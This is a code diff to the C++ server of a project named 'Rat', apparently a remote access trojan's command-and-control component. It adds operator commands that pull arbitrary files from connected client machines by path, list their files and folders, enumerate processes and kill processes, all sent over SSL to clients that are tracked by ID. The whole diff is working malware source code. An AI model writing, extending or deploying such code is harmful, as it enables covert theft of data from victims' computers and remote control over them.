@@ -137,35 +137,100 @@ namespace Rat
                     removeClient(client);
                     return;
                 }
-                if (packet.has_chunked_data() && packet.type() == rat::Packet::STATIC_ID) 
+                if (packet.has_chunked_data()) 
                 {
                     
-                    uint64_t source_id = parseStaticIdPayload(packet.chunked_data().payload());
-                    if (client_id_.find(source_id) != client_id_.end()) 
-                    {   
-                        updateClientWithExistingId(client, source_id);
-                        // std::cout << "Debug update: " << source_id << std::endl;
-                    } 
-                    else 
+                    switch (packet.type())
                     {
-                        assignNewClientId(client, source_id);
-                        saveClientIdsToFile(source_id);
-                        // std::cout << "Debug assign: " << source_id << std::endl;
-                    }
-                    
-                    // std::cout << "Debug: clients: ";
-                    // for(auto x: clients_) {std::cout << x.first << " - " << x.second << std::endl;}
+                        case rat::Packet::STATIC_ID:
+                        {
+                            
+                            uint64_t source_id = parseStaticIdPayload(packet.chunked_data().payload());
+                            if (client_id_.find(source_id) != client_id_.end()) 
+                            {   
+                                updateClientWithExistingId(client, source_id);
+                                // std::cout << "Debug update: " << source_id << std::endl;
+                            } 
+                            else 
+                            {
+                                assignNewClientId(client, source_id);
+                                saveClientIdsToFile(source_id);
+                                // std::cout << "Debug assign: " << source_id << std::endl;
+                            }
+                            
+                            boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
+                            break;
+                        }
+                        case rat::Packet::TRANSFER_FILE:
+                        {
+                            // std::cout << "TRANSFER FILE TYPE FROM SERVER: "  << packet.type() << std::endl;
+                            // std::cout << "TRANSFER FILE PAYLOAD FROM SERVER: " << packet.chunked_data().sequence_number() + 1 << " / "
+                            //         << packet.chunked_data().total_chunks() << " = "
+                            //         << (packet.chunked_data().sequence_number() + 1) / float(packet.chunked_data().total_chunks()) * 100 << "%" << std::endl;
+                            uint64_t client_id;
+                            {
+                                std::lock_guard<std::mutex> lock(file_receivers_mutex_);
+                                auto client_it = clients_.find(client);
+                                if (client_it == clients_.end()) {
+                                    std::cerr << "[" << std::time(nullptr) << "] Unknown client sending TRANSFER_FILE\n";
+                                    break;
+                                }
+                                client_id = client_it->second;
+                            }
+                            auto receiver_it = file_receivers_.find(client_id);
+                            if (receiver_it == file_receivers_.end()) {
+                                // std::string file_path = "received_" + Utils::sanitizeFileName(packet.chunked_data().data_id()) + "_" + std::to_string(client_id) + ".txt";
+                                std::string file_path = Utils::sanitizeFileName(packet.chunked_data().data_id()) + "_" + std::to_string(client_id) + Utils::getFileName(packet.file_path());
+                                // std::cout << "Debug file name: " << Utils::getFileName(packet.file_path()) << " " << packet.file_path() << std::endl;
+                                auto receiver = std::make_shared<FileReceiver>(
+                                    client, networkManager_, file_path, packet.chunked_data().data_id(), client_id,
+                                    [this, client_id, client]() {
+                                        // std::lock_guard<std::mutex> lock(file_receivers_mutex_);
+                                        
+                                        // auto it = file_receivers_.find(client_id);
+                                        // if (it != file_receivers_.end()) {
+                                        //     file_receivers_.erase(it);
+                                        //     std::cout << "[" << std::time(nullptr) << "] FileReceiver removed for client " << client_id << "\n";
+                                        // }
+
+                                        // boost::asio::post(networkManager_.get_io_context(), [this, client]() {
+                                        //     handleClient(client);
+                                        // });
+                                        {
+                                            std::lock_guard<std::mutex> lock(file_receivers_mutex_);
+                                            file_receivers_.erase(client_id);
+                                        }
+                                
+                                        handleClient(client);
+                                    });
+
+                                
+                                file_receivers_[client_id] = receiver;
+                                receiver->startReceiving(packet);
+                            } else {
+                                receiver_it->second->startReceiving(packet);
+                            }
+
+                            return; // FileReceiver sẽ tiếp tục xử lý các gói tiếp theo
+                        }
+                        case rat::Packet::LIST_FILES_FOLDERS:
+                        {   
+                            boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); }); 
+                            break; 
+                        }
+                        case rat::Packet::LIST_PROCESSES:
+                        {    
+                            boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
+                            break;
+                        }
+                        default:
+                        {
+                            boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
+                            break;
+                        }
+                    }                    
                 }
-                std::lock_guard<std::mutex> lock(client_mutex_);
                 
-                auto it = clients_.find(client);
-                if (it != clients_.end()) 
-                {
-                    // if(it->second == uint64_t(-1)) {std::cout << "Debug set size: " << clients_.size() << " " << packet.type() << std::endl;}
-                    std::cout << "Client (" << client->lowest_layer().remote_endpoint().address().to_string() + "_" + std::to_string(clients_[client]) << "): "
-                            << packet.chunked_data().payload() << "\n";
-                }
-                boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
             });
     }
 
@@ -180,85 +245,185 @@ namespace Rat
     void Server::handleUserInput() 
     {
         std::string input;
-        std::cout << "Enter packet type (LIST_FILES, LIST_PROCESSES, READ_FILE, KILL_PROCESS): ";
+        std::cout << "Enter packet type (LIST_FILES_FOLDERS, LIST_PROCESSES, READ_FILE, KILL_PROCESS): ";
         while (std::getline(std::cin, input)) 
         {
 
             std::vector<std::string> list_commands = Utils::handleCommand(input);
-            std::cout << "Debug size: " << list_commands.size() << std::endl;
-            for(auto x: list_commands) {std::cout << x << std::endl;}
-            if(list_commands.size() == 2)
+            // std::cout << "Debug size: " << list_commands.size() << std::endl;
+            // for(auto x: list_commands) {std::cout << x << std::endl;}
+            if(list_commands.size() == 3)
             {
                 std::string command = list_commands[0];
                 std::string object = list_commands[1];
+                std::string argument = list_commands[2];
+                // argument = "/home/quang/Downloads/ubuntu.iso";
                 uint64_t object_id = parseStaticIdPayload(object);
                 std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_client = Utils::getSocketFromId(clients_, object_id);
                 // O(n) => optimizer in the furture 
                 if(!socket_client) continue;
                 if (command == "transfer_file")
                 {
-                    std::cout << "Debug transfer_file \n";
+                    // std::cout << "Debug transfer_file argument: " << argument << std::endl;
                     rat::Packet packet_transfer_file;
-                    packet_transfer_file.set_type(rat::Packet::COMMAND);
+                    packet_transfer_file.set_type(rat::Packet::TRANSFER_FILE);
                     packet_transfer_file.set_packet_id("client_" + std::to_string(object_id) + "_" + std::to_string(std::rand()));
-                    packet_transfer_file.set_source_id("client_" + std::to_string(object_id));
-                    packet_transfer_file.set_destination_id("server_0");
+                    packet_transfer_file.set_source_id("server_0");
+                    packet_transfer_file.set_destination_id("client_" + std::to_string(object_id));
                     packet_transfer_file.set_encrypted(true);
+                    packet_transfer_file.set_file_path(argument);
                     auto* chunked = packet_transfer_file.mutable_chunked_data();
                     chunked->set_data_id("TRANSFER_FILE" + std::to_string(std::rand()));
                     chunked->set_sequence_number(0);
                     chunked->set_total_chunks(1);
                     chunked->set_payload(command);
                     chunked->set_success(true);
+                    // std::cout << "debug packet transfer: " << packet_transfer_file.file_path() << std::endl;
                     networkManager_.send(socket_client, packet_transfer_file, [](const boost::system::error_code& ec) 
                     {
                         if (ec) std::cout << "Send error: " << ec.message() << "\n";
                     });
                 }
             }
-
-            if (input == "list_clients") 
+            else if (list_commands.size() == 1)
             {
-                ServerGUI::displayClients(clients_);
-                continue;
+                std::string command = list_commands[0];
+                if (command == "list_files_folders") 
+                {
+                    std::cout << "server send: " << command << std::endl;
+                    rat::Packet packet;
+                    packet.set_type(rat::Packet::LIST_FILES_FOLDERS);
+                    packet.set_packet_id("client_all_" + std::to_string(std::rand()));
+                    packet.set_source_id("server_0");
+                    packet.set_destination_id("client_all");
+                    packet.set_encrypted(true);
+                    packet.set_file_path("");
+                    auto* chunked = packet.mutable_chunked_data();
+                    chunked->set_data_id("LIST_FILES_FOLDERS" + std::to_string(std::rand()));
+                    chunked->set_sequence_number(0);
+                    chunked->set_total_chunks(1);
+                    chunked->set_payload(command);
+                    chunked->set_success(true);
+                    for (auto& client : clients_) 
+                    {
+                        sendCommandToClient(client.first, packet);
+                    }
+                }
             }
-            rat::Packet packet;
-            packet.set_packet_id("server_" + std::to_string(std::rand()));
-            packet.set_source_id("server");
-            packet.set_destination_id("all_clients");
+            else if (list_commands.size() == 2)
+            {
+                std::string command = list_commands[0];
+                std::string object = list_commands[1];
 
-            if (input == "list_files") 
-            {
-                packet.set_type(rat::Packet::LIST_FILES);
-            } 
-            else if (input == "list_processes") 
-            {
-                packet.set_type(rat::Packet::LIST_PROCESSES);
-            } 
-            else if (input == "read_file") 
-            {
-                packet.set_type(rat::Packet::READ_FILE);
-            } 
-            else if (input == "kill_process") 
-            {
-                packet.set_type(rat::Packet::KILL_PROCESS);
-            } 
-            else 
-            {
-                std::cout << "Unknown type, use: LIST_FILES, LIST_PROCESSES, READ_FILE, KILL_PROCESS\n";
-                std::cout << "Enter packet type: ";
-                continue;
+                uint64_t object_id = parseStaticIdPayload(object);
+                std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_client = Utils::getSocketFromId(clients_, object_id);
+
+                if(!socket_client) continue;
+                if (command == "list_files_folders")
+                {
+                    rat::Packet packet_list_files_folders;
+                    packet_list_files_folders.set_type(rat::Packet::LIST_FILES_FOLDERS);
+                    packet_list_files_folders.set_packet_id("client_" + std::to_string(object_id) + "_" + std::to_string(std::rand()));
+                    packet_list_files_folders.set_source_id("server_0");
+                    packet_list_files_folders.set_destination_id("client_" + std::to_string(object_id));
+                    packet_list_files_folders.set_encrypted(true);
+                    
+                    auto* chunked = packet_list_files_folders.mutable_chunked_data();
+                    chunked->set_data_id("LIST_FILES_FOLDERS" + std::to_string(std::rand()));
+                    chunked->set_sequence_number(0);
+                    chunked->set_total_chunks(1);
+                    chunked->set_payload(command);
+                    chunked->set_success(true);
+                    networkManager_.send(socket_client, packet_list_files_folders, [](const boost::system::error_code& ec) 
+                    {
+                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                    });
+                }
+                else if(command == "list_processes")
+                {
+                    rat::Packet packet_list_processes;
+                    packet_list_processes.set_type(rat::Packet::LIST_PROCESSES);
+                    packet_list_processes.set_packet_id("client_" + std::to_string(object_id) + "_" + std::to_string(std::rand()));
+                    packet_list_processes.set_source_id("server_0");
+                    packet_list_processes.set_destination_id("client_" + std::to_string(object_id));
+                    packet_list_processes.set_encrypted(true);
+                    
+                    auto* chunked = packet_list_processes.mutable_chunked_data();
+                    chunked->set_data_id("LIST_PROCESSES" + std::to_string(std::rand()));
+                    chunked->set_sequence_number(0);
+                    chunked->set_total_chunks(1);
+                    chunked->set_payload(command);
+                    chunked->set_success(true);
+                    networkManager_.send(socket_client, packet_list_processes, [](const boost::system::error_code& ec) 
+                    {
+                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                    });
+                }
+                else if (command == "kill_process")
+                {
+                    rat::Packet packet_kill_process;
+                    packet_kill_process.set_type(rat::Packet::KILL_PROCESS);
+                    packet_kill_process.set_packet_id("client_" + std::to_string(object_id) + "_" + std::to_string(std::rand()));
+                    packet_kill_process.set_source_id("server_0");
+                    packet_kill_process.set_destination_id("client_" + std::to_string(object_id));
+                    packet_kill_process.set_encrypted(true);
+                    
+                    auto* chunked = packet_kill_process.mutable_chunked_data();
+                    chunked->set_data_id("KILL_PROCESS" + std::to_string(std::rand()));
+                    chunked->set_sequence_number(0);
+                    chunked->set_total_chunks(1);
+                    chunked->set_payload(command);
+                    chunked->set_success(true);
+                    networkManager_.send(socket_client, packet_kill_process, [](const boost::system::error_code& ec) 
+                    {
+                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
+                    });
+                }
             }
+            continue;
+            /// 
+            // if (input == "list_clients") 
+            // {
+            //     ServerGUI::displayClients(clients_);
+            //     continue;
+            // }
+            // rat::Packet packet;
+            // packet.set_packet_id("server_" + std::to_string(std::rand()));
+            // packet.set_source_id("server");
+            // packet.set_destination_id("all_clients");
 
-            auto* chunked = packet.mutable_chunked_data();
-            chunked->set_payload(input);
+            // if (input == "list_files") 
+            // {
+            //     packet.set_type(rat::Packet::LIST_FILES_FOLDERS);
+            // } 
+            // else if (input == "list_processes") 
+            // {
+            //     packet.set_type(rat::Packet::LIST_PROCESSES);
+            // } 
+            // else if (input == "read_file") 
+            // {
+            //     packet.set_type(rat::Packet::READ_FILE);
+            // } 
+            // else if (input == "kill_process") 
+            // {
+            //     packet.set_type(rat::Packet::KILL_PROCESS);
+            // } 
+            // else 
+            // {
+            //     std::cout << "Unknown type, use: LIST_FILES_FOLDERS, LIST_PROCESSES, READ_FILE, KILL_PROCESS\n";
+            //     std::cout << "Enter packet type: ";
+            //     continue;
+            // }
 
-            for (auto& client : clients_) 
-            {
-                sendCommandToClient(client.first, packet);
-            }
-            std::cout << "Server sent: Type=" << input << ", Data=" << chunked->payload() << "\n";
-            std::cout << "Enter packet type: ";
+            // auto* chunked = packet.mutable_chunked_data();
+            // chunked->set_payload(input);
+
+            // for (auto& client : clients_) 
+            // {
+            //     sendCommandToClient(client.first, packet);
+            // }
+            // std::cout << "Server sent: Type=" << input << ", Data=" << chunked->payload() << "\n";
+            // std::cout << "Enter packet type: ";
         }
     }
 
